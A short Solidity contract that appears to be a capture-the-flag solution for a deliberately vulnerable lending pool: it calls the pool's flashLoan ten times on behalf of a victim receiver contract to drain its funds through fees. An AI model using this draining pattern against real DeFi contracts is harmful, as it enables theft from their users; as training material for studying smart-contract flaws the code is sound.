
pragma solidity 0.8.12;

import {FlashLoanReceiver} from "./FlashLoanReceiver.sol";
import {NaiveReceiverLenderPool} from "./NaiveReceiverLenderPool.sol";


contract DrainReceiver {
    address payable immutable pool;
    address immutable receiver;
    
    constructor (address payable _pool, address _receiver){
        pool = _pool;
        receiver = _receiver;
    }


    function drain() public {

        for(uint256 x; x < 10; x++) {
            NaiveReceiverLenderPool(pool).flashLoan(receiver, 1);
        }

    }
    

}